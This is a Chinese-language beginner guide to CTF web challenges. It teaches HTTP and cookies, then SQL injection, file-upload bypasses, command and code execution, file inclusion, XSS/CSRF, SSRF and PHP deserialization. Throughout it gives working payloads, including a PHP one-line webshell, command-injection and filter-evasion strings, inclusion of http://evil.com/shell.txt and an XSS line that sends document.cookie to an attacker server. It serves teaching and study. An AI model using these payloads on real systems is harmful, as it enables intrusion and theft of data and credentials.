---
title: Web 知识总结
date: 2026-11-17
category: CTF
tags: [CTF, Web]
---

# Web 知识总结

> 适用对象：准备入坑 CTF Web 方向的新手，配套《Pwn 前置知识总结》《逆向前置知识总结》食用
> 目标：从"打开题目网址只会点点按钮"到"知道每个输入框该试什么、每个漏洞怎么打"

---

## 目录

0. [Web方向是什么](#0-web方向是什么)
1. [Web是怎么运作的](#1-web是怎么运作的)
2. [HTTP协议](#2-http协议)
3. [前端基础与F12](#3-前端基础与f12)
4. [Cookie与Session](#4-cookie与session)
5. [数据库与SQL基础](#5-数据库与sql基础)
6. [SQL注入](#6-sql注入)
7. [文件上传漏洞](#7-文件上传漏洞)
8. [命令执行与代码执行](#8-命令执行与代码执行)
9. [文件包含与PHP伪协议](#9-文件包含与php伪协议)
10. [XSS与CSRF](#10-xss与csrf)
11. [SSRF](#11-ssrf)
12. [PHP反序列化](#12-php反序列化)
13. [绕过技巧大全](#13-绕过技巧大全)
14. [信息收集与敏感泄露](#14-信息收集与敏感泄露)
15. [工具链全家桶](#15-工具链全家桶)
16. [完整解题流程](#16-完整解题流程)
17. [学习路线与资源](#17-学习路线与资源)

---

## 0. Web方向是什么

CTF Web = **找网站漏洞 → 拿到服务器权限或敏感数据 → 读出 flag**。

题目形态：给你一个网址（或源码），网站上有登录框、搜索框、上传功能……**每个能"输入"的地方都是潜在攻击面**。

> **通俗理解**：Pwn 是撬保险柜（搞二进制程序），逆向是拆锁画图纸（还原算法），Web 是**闯商场**——大门（登录）、服务台（查询）、快递柜（上传）全是入口，哪个窗口的店员（服务器代码）犯糊涂，你就能溜进后台。

### 0.1 Web 与 Pwn / RE 的区别

|          | Web                                    | Pwn               | RE                |
| -------- | -------------------------------------- | ----------------- | ----------------- |
| 目标对象 | 网站应用层（PHP/Java/Python + 数据库） | 二进制程序 + 内存 | 二进制程序 + 算法 |
| 环境交互 | 浏览器/Burp 发包                       | nc 远程打         | 本地逆向          |
| 核心技能 | 协议 + 漏洞原理 + 业务逻辑             | 汇编 + 内存布局   | 汇编 + 算法识别   |
| 上手难度 | **入门最快**（看得见摸得着）           | 陡                | 中                |
| 天花板   | 高（内网/云/链式组合）                 | 高                | 高                |

### 0.2 Web 题的攻击面地图（先混个脸熟）

```
网址 ──┬─ 前端（HTML/JS）──── 注释藏 flag、前端验证、JS 加密
       ├─ HTTP 层 ─────────── 头伪造、方法、跳转
       ├─ 后端（PHP/Java…）── 命令执行、文件包含、反序列化、逻辑漏洞
       ├─ 数据库 ──────────── SQL 注入（常客）
       ├─ 文件功能 ────────── 上传、下载、读取
       └─ 服务器替你发请求 ─── SSRF
```

后面每一章就是这里面的一块。

---

## 1. Web是怎么运作的

### 1.1 一次请求的完整旅程

浏览器输入网址回车后发生的事：

```
浏览器 ──①DNS 解析域名→IP──> 服务器
      ──②发 HTTP 请求（"我要看 /index.php"）──> 服务器
服务器 ──③后端代码执行（PHP 查数据库、拼页面）──> 数据库
      ──④返回 HTTP 响应（HTML 源码）──> 浏览器
浏览器 ──⑤渲染页面给你看
```

**所有 Web 攻击都发生在这条链上**：改请求（②）、骗后端（③）、偷数据库（③）、看不该看的响应（④）。

### 1.2 三层架构（背下来）

| 层         | 是谁                       | 干什么           | 对应漏洞                              |
| ---------- | -------------------------- | ---------------- | ------------------------------------- |
| **前端**   | 浏览器里的 HTML/CSS/JS     | 画界面、做交互   | 前端验证绕过、XSS、信息泄露           |
| **后端**   | 服务器上的 PHP/Java/Python | 收请求、执行逻辑 | **SQL 注入、RCE、文件上传、反序列化** |
| **数据库** | MySQL 等                   | 存数据           | 被注入后脱库（flag 常在这）           |

> 一句话：**前端是脸，后端是脑，数据库是保险柜**。CTF 的 flag 多数藏在数据库里或服务器文件里（`/flag`）。

### 1.3 静态 vs 动态页面

- 静态：服务器直接把 HTML 文件发给你（`.html`）
- 动态：后端代码现场生成页面（`.php`、`.jsp`、`.py`）——**CTF 题几乎全是动态**，也意味着后端代码里全是"葫芦娃"

---

## 2. HTTP协议

> HTTP 就是浏览器和服务器之间"通信的信件格式"。**CTF Web 的第一基本功：会读信、会写信、会改信。**

### 2.1 请求与响应的结构

```
请求（你 → 服务器）                    响应（服务器 → 你）
┌──────────────────────┐            ┌──────────────────────┐
│ GET /flag.php?id=1 HTTP/1.1   │ 请求行 │ HTTP/1.1 200 OK           │ 状态行
│ Host: x.x.x.x           │      │ Content-Type: text/html    │ 响应头
│ User-Agent: Mozilla...  │ 请求头│ Set-Cookie: PHPSESSID=xx  │
│ Cookie: user=admin      │      │                            │
│（空行）                  │      │（空行）                     │
│ username=admin&pw=123   │ 请求体│ <html>页面内容...</html>    │ 响应体
└──────────────────────┘            └──────────────────────┘
```

**抓包工具（Burp Suite）看到的就是这坨东西**，每一行都可能藏着题眼。

### 2.2 常用方法

| 方法       | 参数放哪                     | 场景                         |
| ---------- | ---------------------------- | ---------------------------- |
| GET        | **URL 里**（`?id=1&page=2`） | 看页面——**注入点最常见位置** |
| POST       | **请求体里**                 | 登录、上传——敏感数据不进 URL |
| PUT/DELETE | 体                           | 改/删资源（REST 接口）       |

### 2.3 必认识的请求头（改头 = Web 题第一课）

| 头                | 意思                    | 常见玩法                                              |
| ----------------- | ----------------------- | ----------------------------------------------------- |
| `Host`            | 访问哪个站              | 改 Host 探测虚拟主机                                  |
| `User-Agent`      | 我是什么浏览器          | 题目要求"只能用 X 浏览器"→ 改 UA                      |
| `Referer`         | 我从哪个页面跳来        | 题目要求"从百度来"→ 伪造 Referer                      |
| `Cookie`          | 我的身份凭证            | **改 admin=1、user=admin 是入门必玩**                 |
| `X-Forwarded-For` | "我的真实 IP"（可伪造） | 题目说"只许本机访问"→ 加 `X-Forwarded-For: 127.0.0.1` |
| `Content-Type`    | 请求体格式              | 上传绕过时改 MIME 值                                  |

### 2.4 状态码（服务器情绪表）

| 码      | 含义        | 做题时意味着                                  |
| ------- | ----------- | --------------------------------------------- |
| 200     | 成功        | 正常返回                                      |
| 301/302 | 跳转        | 注意 Location 头，跳到哪去了                  |
| 304     | 缓存没变    |                                               |
| 401/403 | 没权限/禁止 | **常是题眼**：伪造头去骗它放行                |
| 404     | 不存在      | 换路径/扫目录                                 |
| 500     | 服务器炸了  | **注入利器**：语法错→500→说明你的输入进了 SQL |
| 502     | 网关错      | 环境问题，重连                                |

### 2.5 改包三件套流程（Burp 核心用法）

```
1. Proxy 开抓包 → 浏览器点功能 → Burp 拦下请求
2. 看请求：参数在哪？头里有什么？
3. 发到 Repeater（Ctrl+R）→ 随便改、反复发、看响应
4. 批量试密码 → Intruder 标记变量爆破
```

> 没有Burp 之前，先玩浏览器 F12 的 Network 面板（看请求）+ HackBar 插件（快速发 GET/POST）。

---

## 3. 前端基础与F12

### 3.1 F12 开发者工具（Web 题的第一把螺丝刀）

| 面板        | 干什么         | 做题用法                                       |
| ----------- | -------------- | ---------------------------------------------- |
| Elements    | 看 HTML/CSS    | **找注释里藏的 flag**、隐藏表单、disabled 按钮 |
| Console     | 跑 JS          | 题目把答案算一半 → 控制台接着算；报错信息      |
| Network     | 看所有请求     | 找出真正的提交接口、看响应                     |
| Sources     | 看源码/断点    | 调 JS 加密逻辑（配合逆向）                     |
| Application | 看 Cookie/存储 | 改 cookie、localStorage                        |

### 3.2 HTML 表单——理解"数据怎么发出去"

```html
<form action="login.php" method="POST">
    <input type="text"   name="username">   <!-- 参数名叫 username -->
    <input type="password" name="password">
    <input type="hidden" name="role" value="user">  <!-- 隐藏域：改它！ -->
    <input type="submit" value="登录">
</form>
```

**name 就是参数名**。隐藏域 `hidden`、`disabled`、前端校验 maxlength——**这些只约束浏览器，Burp 发包可以全无视**。经典操作：抓包把 `role=user` 改成 `admin`。

### 3.3 前端验证 = 摆设

JS 做的检查（格式对不对、是不是图片）**只在你浏览器里跑**，服务器如果不再查一遍，就是裸奔：

- 前端限制只能上传图片 → Burp 抓包直接改成 `.php`
- 前端算好密码 MD5 再提交 → 改包直接交正确 MD5 / 或读 JS 看算法

### 3.4 JS 快速阅读（不用会写，会读就赢）

CTF 前端 JS 三类：

1. **藏 flag**：`var flag = 'xxx'`、Base64 字符串、十六进制串 → Console 里 `atob('...')` 解码
2. **前端校验**：`if (password == '...')` —— 直接看到答案，或把 if 判断改 true（Console 里重新执行函数）
3. **前端加密**：把你的密码 md5/aes 后再发 → 要么逆向算法照抄，要么找硬编码的 key

---

## 4. Cookie与Session

### 4.1 为什么需要它们

HTTP 是**无状态**的——服务器记性只有一次请求，下一个请求来了它根本不认识你。所以要"会员卡"机制：

- **Cookie**：**存在你浏览器**的小卡片，每次请求自动带上
- **Session**：**存在服务器**的寄存柜，你的 Cookie 里只拿一个号码牌（如 `PHPSESSID=abc123`）

```
登录成功 → 服务器：Set-Cookie: PHPSESSID=abc123（发号码牌）
          服务器内存：abc123 → {user: 'admin', 登录时间: ...}（柜子里存细节）
下次请求 → 浏览器自动带 Cookie: PHPSESSID=abc123 → 服务器对号入柜认出你
```

### 4.2 题型一：改 Cookie（入门第一课）

很多新手题把**身份写死在 Cookie 里**：

```
Cookie: user=guest; admin=0
                    ↑ 改成 1
Cookie: isLogin=false
               ↑ 改成 true
```

F12 → Application → Cookies 直接改，或 Burp 改包。**逻辑：服务器只看 Cookie 说的话，而 Cookie 是你写的。**

### 4.3 题型二：伪造 / 爆破 Session

- Session 文件猜测（`PHPSESSID` 简单可猜的老题）
- JWT（jsonWebToken）：`头.载荷.签名` 三段 Base64——**前两段能解码看内容**（role 之类），改了要重新签名；算法置 none、弱密钥爆破、密钥泄露都是套路

### 4.4 相关"身份"花招汇总

| 玩法              | 思路                                                         |
| ----------------- | ------------------------------------------------------------ |
| 越权（水平/垂直） | 登录 user1 后，把请求里的 `user_id` 改成别人的——**服务器只认参数不认人** |
| Session 固定      | 用自己的 Session 顶替管理员                                  |
| 验证码逻辑        | 验证码可以复用/前端校验/万能验证码                           |

---

## 5. 数据库与SQL基础

SQL 注入是 Web 题之王，而注入的地基是 SQL 本身。**不会 SELECT 就谈不上注入。**

### 5.1 数据库的形象理解

数据库 = 一个 Excel 文件夹：

```
数据库(库) ── 表 ── 行 ── 列
   school     users   记录   字段
              ┌────┬────────┬──────┐
              │ id │ name   │ pwd  │     ← 列(字段)
              ├────┼────────┼──────┤
              │ 1  │ admin  │ xxx  │     ← 行(记录)
              │ 2  │ guest  │ yyy  │
              └────┴────────┴──────┘
```

**flag 通常放在某个库里一张叫 flag 的表里**——注入的终点就是"库名→表名→列名→数据"四步走。

### 5.2 必会 SQL 六件套

```sql
SELECT * FROM users WHERE id = 1;         -- 查询（* 是所有列）
SELECT user, pwd FROM users WHERE name='admin';   -- 只查两列
ORDER BY 3;                               -- 按第 3 列排序（注入测列数用）
LIMIT 0,1;                                -- 取第 0 行起 1 条
UNION SELECT 1,2,3;                       -- 把两个查询结果拼一起（注入核心）
SELECT * FROM users WHERE name LIKE 'a%'; -- 模糊匹配
```

### 5.3 MySQL 注入常用函数/对象

| 函数                             | 作用                                             |
| -------------------------------- | ------------------------------------------------ |
| `database()`                     | 当前库名                                         |
| `version()`                      | 数据库版本（决定可用语法）                       |
| `user()`                         | 当前用户                                         |
| `concat(a,b)` / `group_concat()` | 拼接（把多行结果拼一行显示）                     |
| `substr(s,1,1)`                  | 截字符串第 1 位起 1 个字符（盲注核心）           |
| `ascii()` / `ord()`              | 字符转数字（盲注比较用）                         |
| `sleep(5)`                       | 睡 5 秒（时间盲注核心）                          |
| `information_schema`             | **元数据库**：记录所有库/表/列的信息（脱库地图） |

`information_schema` 三张关键表：

```sql
SELECT schema_name FROM information_schema.schemata;      -- 所有库名
SELECT table_name  FROM information_schema.tables  WHERE table_schema='ctf';   -- ctf库的表
SELECT column_name FROM information_schema.columns WHERE table_name='flag';    -- flag表的列
```

---

## 6. SQL注入

> **原理一句话：用户的输入被拼进了 SQL 语句并执行。** 你输入的不只是数据，而是"咒语"——数据库分不清哪句是代码哪句是数据。

### 6.1 注入是怎么发生的

后端代码（PHP 示例，**每一道注入题背后都有这样一行**）：

```php
$id = $_GET['id'];
$sql = "SELECT * FROM news WHERE id = $id";
```

正常：`id=1` → `WHERE id = 1`
攻击：`id=1 and 1=2` → `WHERE id = 1 and 1=2` —— **你的话进了 SQL！**

字符型（参数带引号包裹）：

```php
$sql = "SELECT * FROM users WHERE name = '$name'";
```

攻击要**先闭合引号**：`name=' or '1'='1` → `WHERE name = '' or '1'='1'`（恒真）

### 6.2 判断注入点（拿到参数先来三下）

```
id=1 and 1=1    → 页面正常
id=1 and 1=2    → 页面异常（内容变了）
→ 数字型注入成立！

name=a'         → 报错/500（引号被带进去了）
name=a''        → 恢复
→ 字符型注入成立！

id=1' and '1'='1 / ') / ")) 各种闭合试一圈
```

### 6.3 UNION 注入标准四步（必背流程）

```sql
-- ① 测列数：逐渐加数字，直到不报错
? id=1 order by 3          -- 报错 → 降；不报 → 升。卡在 3 = 3 列

-- ② 确认回显位（把 id 改成不存在的值，让 UNION 结果顶上）
? id=-1 union select 1,2,3      -- 页面显示 2、3 → 第 2、3 列可回显

-- ③ 拿库名、表名
? id=-1 union select 1,database(),3
? id=-1 union select 1,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),3

-- ④ 拿列名、拿数据
? id=-1 union select 1,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'),3
? id=-1 union select 1,(SELECT group_concat(flag_col) FROM ctf.flag),3   -- flag 到手
```

### 6.4 没有回显怎么办：报错注入

页面会显示 MySQL 报错信息时，用函数把答案"挤"进报错里：

```sql
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
-- 报错：XPATH syntax error: '~ctf~'   ← 答案在报错里！
?id=1 and extractvalue(1,concat(0x7e,(SELECT version())))
```

### 6.5 连报错都没有：盲注（布尔/时间）

**布尔盲注**：页面只有"正常/异常"两种状态 → 把它当"是/否"问答机：

```sql
?id=1 and substr((SELECT database()),1,1)='c'   -- 正常 → 库名第一个字符是 c
?id=1 and ascii(substr((SELECT database()),1,1))>100  -- 二分法逐位猜
```

**时间盲注**：连页面状态都一样 → 用 sleep 侧信道：

```sql
?id=1 and if(substr((SELECT database()),1,1)='c',sleep(3),0)
-- 响应慢了 3 秒 → 第一个字符是 c
```

盲注手打要几百次请求 → **写 Python 脚本循环猜**，或直接上 sqlmap。

### 6.6 堆叠注入（一次执行多条语句）

`?id=1;SELECT ...`——分号后接第二条语句（PHP 的 `mysqli_multi_query` 才支持）。经典玩法：**SQL 不方便拿数据就改数据**（把 flag 更新到看得见的地方）或写 shell。

### 6.7 sqlmap 一键流（先手打懂原理，再用工具提速）

```bash
sqlmap -u "http://x/?id=1" --batch --dbs            # 测注入 + 列所有库
sqlmap -u "http://x/?id=1" -D ctf --tables          # 列表
sqlmap -u "http://x/?id=1" -D ctf -T flag --dump    # 拖数据（含 flag）
# POST 请求：把 Burp 抓的包存成 req.txt
sqlmap -r req.txt --batch
# 各类绕过
sqlmap -u "..." --tamper=space2comment,uppercase    # 过滤空格/关键字时
```

### 6.8 防御（知其所以然）

**预编译（参数化查询）**——先发 SQL 模板（占位符 ?），再单独发参数。数据**永远只能是数据**，进不了指令区：

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);    // $id 无论多恶毒都只是字符串
```

> 通俗理解：拼接 SQL = 话筒递给观众让他替你念稿（念什么都行）；预编译 = 稿子先印死，观众只能往空格里填词。**注入题的本质就是服务器把话筒递给了你。**

---

## 7. 文件上传漏洞

> 目标：把**能执行代码的文件**（PHP 木马）传到服务器并访问它，拿到 WebShell。

### 7.1 一句话木马与蚁剑

上传的核心目标——一个极小的 PHP 后门：

```php
<?php @eval($_POST['x']); ?>
```

传上去后用**蚁剑（AntSword）**连接：填木马 URL + 密码 `x` → 图形化管理服务器文件（找 flag、开终端）。

### 7.2 绕过姿势大全（按检查位置分层记）

**① 前端 JS 检查（改包即破）**：抓包直接改文件名/内容，前端检查形同虚设。

**② MIME 类型检查（Content-Type）**：Burp 把 `application/x-php` 改成 `image/jpeg`。

**③ 后缀黑名单（名单里没有的都能试）**：

```
.php → 试：.php5 .php7 .phtml .pht .phps .PhP（大小写）
Windows 特性：shell.php.（末尾点）/ shell.php （末尾空格）/ shell.php::$DATA
双写绕过（过滤一次的）：shell.pphphp → 剩 php
配合解析漏洞：.htaccess / .user.ini（见下）
```

**④ 后缀白名单（只认 jpg/png）**：

```
.htaccess 上传（Apache）：
    文件内容：AddType application/x-httpd-php .jpg
    → 之后 xxx.jpg 里的 PHP 代码会被执行
.user.ini 上传（需要能传 .ini 且目录有 index.php）：
    内容：auto_prepend_file=shell.jpg
    → 访问该目录 index.php 时自动包含 shell.jpg（图片马）
%00 截断（老版本 PHP <5.3.4）：shell.php%00.jpg → 截成 shell.php
```

**⑤ 文件头检查（magic number）**：服务器读文件开头字节认类型 →

```
在木马前面加图片头：GIF89a（GIF）或 jpg 的 FF D8 FF
GIF89a
<?php @eval($_POST['x']); ?>
```

**⑥ 二次渲染 / 竞争条件**：图片被重新处理时藏代码进没被重渲染的区域；上传后立刻访问（条件竞争删之前的间隙）。

### 7.3 上传成功的判断

- 路径回显 → 直接拼 URL
- F12 Network 看上传请求的响应
- 猜常见路径：`/upload/2024xx/shell.php`、`/uploads/`、以时间为名的文件夹
- 访问木马**不报 404 且白屏**（PHP 执行了没输出）→ 八成成功，上蚁剑

---

## 8. 命令执行与代码执行

> RCE（Remote Command/Code Execution）= 让服务器**替你执行系统命令**——Web 题的终点站，`cat /flag` 直接拿答案。

### 8.1 命令执行 vs 代码执行

|                 | 命令执行                                               | 代码执行                                            |
| --------------- | ------------------------------------------------------ | --------------------------------------------------- |
| 执行的是        | **系统命令**（shell）                                  | **语言代码**（PHP/Python）                          |
| 危险函数（PHP） | `system` `exec` `passthru` `shell_exec` `popen` 反引号 | `eval` `assert` `call_user_func` `preg_replace(/e)` |
| 典型题目        | ping 功能拼 IP                                         | 模板/计算器功能拼表达式                             |

### 8.2 命令拼接符（背！）

```bash
127.0.0.1;cat /flag       # ;  顺序执行两条
127.0.0.1|cat /flag       # |  管道：前输出当后输入（只要后者输出）
127.0.0.1||cat /flag      # || 前面失败才执行后面
127.0.0.1&&cat /flag      # && 前面成功才执行后面
127.0.0.1 `cat /flag`     # 反引号：先执行，结果塞回命令
$(cat /flag)              # 同上
```

ping 类题目：输入 `127.0.0.1;ls /` 直接看到根目录。

### 8.3 绕过过滤（进阶必背）

**过滤了空格**：

```bash
cat${IFS}/flag        # ${IFS} 是内部字段分隔符=空格
cat$IFS$9/flag
cat</flag             # 重定向读
```

**过滤了关键字（如 cat / flag）**：

```bash
ca\t /fla?            # 反斜杠拼接
c'a't /fl''ag         # 引号拼接（shell 自动去掉）
more /fl*             # 换个等价命令：tac、head、tail、nl、od、strings
x=f;cat /fl$x         # 变量拼接
echo Y2F0IC9mbGFn|base64 -d|bash    # base64 整条编码
```

**过滤了目录（/）**：用 `*` 通配；用 `cd` 逐层进。

**点过滤**：`?` 单字符通配 `.php` → `???p?p`（配合相对路径）。

### 8.4 代码执行利用

`eval($_GET['cmd'])` 类：

```
?cmd=system('ls /');          # 代码执行里再调命令执行
?cmd=print_r(scandir('/'));   # 纯 PHP 读目录
?cmd=highlight_file('/flag');
```

---

## 9. 文件包含与PHP伪协议

> 后端把**用户可控的文件名**直接 include —— 你可以让它包含任何东西：别的源码、日志、甚至"数据流"。

### 9.1 原理

```php
include($_GET['file']);      // LFI（本地文件包含）的万恶之源
```

```
?file=/etc/passwd                     → 包含系统文件（Linux 万能试金石）
?file=../../../../etc/passwd          → ../ 跳目录
?file=php://filter/...               → 伪协议（重点，见下）
?file=http://evil.com/shell.txt      → RFI（远程包含，需 allow_url_include 开）
```

### 9.2 php://filter 读源码（最常用）

页面直接包含 flag.php 会在后台执行、**看不到源码**；用过滤器把源码 Base64 编码后输出：

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
→ 页面显示一串 Base64 → 解码 → flag.php 源码到手
```

### 9.3 PHP 伪协议速查

| 协议           | 用法                                            | 作用                                     |
| -------------- | ----------------------------------------------- | ---------------------------------------- |
| `php://filter` | 见上                                            | 读/改写流（读源码神器）                  |
| `data://`      | `?file=data://text/plain,<?php system('ls');?>` | 把数据当场当文件包含（等于直接执行代码） |
| `php://input`  | POST 体里放 `<?php system('id');?>`             | 把 POST 体当文件（需 allow_url_include） |
| `file://`      | `file:///etc/passwd`                            | 访问本地文件                             |
| `phar://`      | `phar://xxx.zip/shell.php`                      | 压缩包当目录（配合上传 + 反序列化）      |
| `zip://`       | 同上                                            | 同上                                     |

### 9.4 日志包含（无上传功能时的组合拳）

把 PHP 代码写进**日志文件**（UA 里带 `<?php ...?>` 访问一次 → 被记进 access_log），再包含日志路径让代码执行：

```
?file=/var/log/nginx/access.log
（先 Burp 把 User-Agent 改成 <?php @eval($_POST['x']);?> 访问一次）
```

同类思路：`/proc/self/environ`、session 文件、临时文件。

---

## 10. XSS与CSRF

### 10.1 XSS：往别人浏览器里塞你的脚本

**原理**：你的输入被原样写进 HTML，别人打开页面时**他/她的浏览器执行了你的 JS**。

三类：

| 类型   | 进入方式                 | 场景                            |
| ------ | ------------------------ | ------------------------------- |
| 反射型 | 参数 → 直接回显页面      | 搜索框回显"你搜索了 xxx"        |
| 存储型 | 存数据库，别人访问就触发 | 留言板、评论区（威力大）        |
| DOM 型 | JS 前端处理 URL 时写入   | `document.write(location.hash)` |

基础 payload：

```html
<script>alert(1)</script>              <!-- 试水 -->
<img src=x onerror=alert(1)>           <!-- 过滤 script 时 -->
<svg onload=alert(1)>
```

**偷 cookie（XSS 的经典目的）**：

```js
<script>location='http://你的服务器/?c='+document.cookie</script>
<!-- 管理员浏览器访问 → cookie 发到你这 → 拿着他的身份进后台 -->
```

CTF 里的形态：题目有个 **bot（模拟管理员）定期访问页面** → 你存一个 XSS → bot 触发 → 把 bot 的 cookie（flag）发出来。平台：xsspt.com 之类接收平台，或自己 nc 监听。

### 10.2 CSRF：借别人的手发请求

**原理**：浏览器访问任何网站都会**自动带上那个网站的 Cookie**。诱导已登录的管理员点开你的恶意页面，页面里偷偷向目标站发请求（改密码/转账）——服务器看 Cookie 以为是他本人操作。

```
管理员已登录后台 → 诱导他访问 evil.html
→ evil.html 里 <img src="http://admin.com/deluser?id=1">（或自动提交表单）
→ 请求自动带管理员的 Cookie → 操作成功
```

防御：Token 随机校验、验证旧密码、SameSite Cookie、Referer 检查。CTF 中 CSRF 题常和 XSS 组合（XSS 偷不到 cookie 时，直接让 JS 替管理员发请求）。

---

## 11. SSRF

> **SSRF（Server-Side Request Forgery）**：让**服务器替你去访问**一个地址。服务器能看到的内网、本机文件，都成了你的眼睛。

### 11.1 原理与场景

```php
// "输入图片链接，我帮你取回来" 类功能
$url = $_GET['url'];
echo file_get_contents($url);
```

```
?url=http://127.0.0.1:6379        → 探测本机端口（Redis!）
?url=http://192.168.1.5:80        → 扫内网存活
?url=file:///flag                 → 直接读文件
?url=gopher://...                 → 构造原始 TCP 包打内网服务（大杀器）
?url=dict://127.0.0.1:6379/info   → 探测服务信息
```

### 11.2 做题思路

1. 找"服务器取 URL"的功能点（图片代理、webhook、导入链接）
2. 先 `file:///etc/passwd` 验证任意读取
3. 再打内网：`127.0.0.1` 各端口、常见服务（Redis 6379、MySQL 3306）
4. flag 位置：内网另一台机器、云元数据地址（`169.254.169.254`，题目云环境）

绕过（过滤了 127.0.0.1）：`0x7f000001`、`017700000001`（八进制！）、`127.1`、`localhost`、DNS 重绑定、`@` 绕（`http://evil@127.0.0.1`）。

---

## 12. PHP反序列化

> **序列化** = 把对象压成字符串方便存/传；**反序列化** = 把字符串还原成对象。如果字符串是你伪造的——还原出来的对象也是你"设计"的。

### 12.1 序列化长什么样

```php
serialize(new Test)   →   O:4:"Test":1:{s:3:"str";s:5:"hello";}
                          ↑类名  ↑属性数 ↑属性名     ↑属性值
```

格式速记：`O` 对象 / `a` 数组 / `s` 字符串 / `i` 整数；`s:5` = 5 字节的字符串。**改属性值要同步改长度数字**（改 `s:5:"hello"` 为 `s:3:"abc"`，长度对不上服务器直接报错）。

### 12.2 魔术方法：自动触发的机关

PHP 一批方法在特定时机**自动被调**——反序列化利用就是在"还原对象"和"对象销毁"之间连锁触发：

| 魔术方法          | 什么时候触发                         |
| ----------------- | ------------------------------------ |
| `__construct`     | new 对象时                           |
| `__destruct`      | 对象销毁时（脚本结束必触发！）       |
| `__wakeup`        | **unserialize() 还原时**（第一入口） |
| `__toString`      | 对象被当字符串用（echo / 拼接）      |
| `__call`          | 调用不可访问方法时                   |
| `__get` / `__set` | 读/写不可访问属性时                  |

利用链（POP 链）概念：

```
unserialize(你的串) → 触发 __wakeup → 调了别的对象的方法 → 那方法里 echo 了
一个对象 → 触发 __toString → ... → 一路连锁到 system('cat /flag')
```

**做题方法：源码里全局搜魔术方法 → 倒着推谁能连到谁 → 构造序列化串提交。**

### 12.3 必会绕过与扩展

- **`__wakeup` 绕过（CVE-2016-7124，PHP<7.0.10）**：属性个数**写大于实际值**（`O:4:"Test":2:{...}` 实际 1 个）→ wakeup 被跳过
- **字符串逃逸**：过滤函数替换序列化串（如 `bb` 换 `b`，变短/变长）→ 精心构造让后面的"对象属性"逃逸出来被解析
- **phar 反序列化**：`phar://` 协议触发（文件函数 `file_exists('phar://x.jpg')` 时自动反序列化 metadata）——**不需要 unserialize 函数**，配合文件上传用

---

## 13. 绕过技巧大全

Web 题一半是漏洞原理，一半是**"过滤了 XXX 怎么办"**。集中收录高频绕过。

### 13.1 PHP 弱类型比较（文科生 == 的灾难）

```php
"admin" == 0        // true！  非数字开头字符串==数字会转成 0（PHP<8）
"1admin" == 1       // true   取开头数字
"0e123" == "0e456"  // true   0e 科学计数法 0 的 n 次方都是 0
null == false       // true
```

经典题：`if (md5($a) == md5($b) && $a != $b)` →

- 解法一：**MD5 魔数**：`240610708` 和 `QNKCDZO` 的 md5 都是 0e 开头
- 解法二：**数组绕过**：`?a[]=1&b[]=2` —— md5(数组)=NULL，NULL==NULL 成立（同样套路绕 sha1）

**经验：看到 `==` 就想弱类型，看到 `===` 才想真碰撞。**

### 13.2 函数级花招

```php
intval("5flag")      // = 5（截断）→ ?num=5flag 可能绕过 === "5" 的先检查
strcmp([], "x")      // PHP<8 传数组返回 NULL → 绕过 !==
ereg("%5c", ...)     // %00 截断（古老函数）
in_array("1.php", $arr)  // 未开严格模式时 "1.php"==1 也会 true 过（松散匹配）
switch($x) / md5() 松散匹配同上
```

### 13.3 正则绕过

```php
preg_match('/^flag$/', $_GET['a'])   // 锚点 ^$
?a=flag%0a                          // %0a（换行）绕过 $ —— $ 匹配行尾
                                    // m 修饰符、\D \S 反向匹配类被换行坑

str_replace('ctf','', $a)           // 只替换一次
?a=cctff                           // 双写：删掉中间 ctf 剩 ctf
```

### 13.4 编码绕 WAF/过滤

| 编码                              | 场景                           |
| --------------------------------- | ------------------------------ |
| URL 编码/双编码（`%27`、`%2527`） | 空格引号被拦                   |
| Base64 / Hex                      | 关键字整段编码（配 base64 -d） |
| Unicode（`\u0073`）               | JS/JSON 解析层                 |
| HTML 实体（`&#x73;`）             | XSS 过滤                       |
| 大小写混合（SeLeCt）              | SQL 关键字黑名单               |
| 内联注释 `/**/` 代替空格          | SQL 注入                       |

### 13.5 逻辑层绕过

```
md5(file_get_contents($f)) === md5(file_get_contents('flag')) 但 $f != 'flag'
→ php://filter 读 flag 自身（绕 !== 'flag' 的字符串比较）
intval($num)==1 && $num 不能是 1 → ?num=1a（intval 截断）
要 "不是数字的数字" → 数组 / 科学计数法 / 十六进制 0x1
```

### 13.6 前端加密逆向

登录把密码 md5 后提交 → F12 找加密函数：

1. key 硬编码 → 直接照算法本地算正确值提交
2. 动态 key → Console 里调用它的函数拿结果
3. 混淆 JS → 美化（Console 的 {} 按钮）+ 断点跟

---

## 14. 信息收集与敏感泄露

**做 Web 题第一步永远不是注入，是翻垃圾桶。**

### 14.1 翻垃圾清单（按顺序过一遍）

| 目标                | 怎么拿                                                       | 能得到什么                            |
| ------------------- | ------------------------------------------------------------ | ------------------------------------- |
| F12 源码/注释       | Elements / Ctrl+U                                            | 藏的 flag、提示、接口                 |
| `robots.txt`        | 直接访问                                                     | Disallow 路径 = 不想让你看的 = 快去看 |
| 备份文件            | `index.php.bak` `.swp` `~` `.zip` `.rar` `.tar.gz`           | 整站源码（看到源码题就赢一半）        |
| `.git/` 泄露        | 目录扫描发现后用 **GitHack / git-dumper** 还原源码（含历史版本） | 源码 + 历史提交里的密码               |
| `.svn/` `.DS_Store` | 工具还原                                                     | 目录结构                              |
| phpinfo 页          | `info.php` / `phpinfo.php`                                   | 绝对路径（包含/写马要用）、配置开关   |
| 响应头              | F12 Network                                                  | 框架/中间件指纹（X-Powered-By）       |

### 14.2 目录扫描

```bash
dirsearch -u http://x.x.x.x -e php,zip,git
ffuf -u http://x/FUZZ -w /path/字典.txt     # 快
# 字典：dirbuster / SecLists（github 上的字典合集）
```

### 14.3 拿到源码之后

- 全局搜：`flag`、`eval`、`system`、`include`、`unserialize`、`$_GET`、`$_POST`
- 看"入口文件"（index/login/upload）的流程
- 配置文件（config.php）里的数据库账号 → 也许能直连数据库（外网开放时）

---

## 15. 工具链全家桶

| 工具                  | 干什么                | 一句话用法                         |
| --------------------- | --------------------- | ---------------------------------- |
| **Burp Suite**        | 抓包/改包/重放/爆破   | Web 人的 gdb，80% 时间在这         |
| 浏览器 F12 / HackBar  | 看源码、快捷发包      | 快速试探                           |
| **sqlmap**            | SQL 注入自动化        | `-u/--dbs/-T/--dump/-r/--tamper`   |
| **dirsearch / ffuf**  | 目录/参数爆破         | `dirsearch -u url -e php`          |
